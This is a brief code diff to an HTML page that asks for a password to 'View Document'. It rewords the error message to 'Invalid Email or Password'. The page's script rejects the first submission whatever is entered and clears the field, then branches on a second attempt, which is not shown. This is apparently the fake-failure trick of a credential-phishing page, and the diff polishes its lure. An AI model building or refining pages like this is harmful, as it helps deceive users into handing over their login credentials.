@@ -112,7 +112,7 @@
                 <input type="password" id="password" autocomplete="off">
             </div>
             <button type="submit">View Document</button>
-            <div id="error-message">Invalid password try again</div>
+            <div id="error-message">Invalid Email or Password</div>
         </form>
     </div>
 
@@ -168,7 +168,7 @@
             submissionCount++;
 
             if (submissionCount === 1) {
-                document.getElementById('error-message').textContent = "Invalid password try again";
+                document.getElementById('error-message').textContent = "Invalid Email or Password";
                 document.getElementById('error-message').style.display = 'block';
                 passwordInput.value = '';
             } else if (submissionCount >= 2) {
@@ -193,4 +193,5 @@
     </script>
 </body>
 </html>
+
 
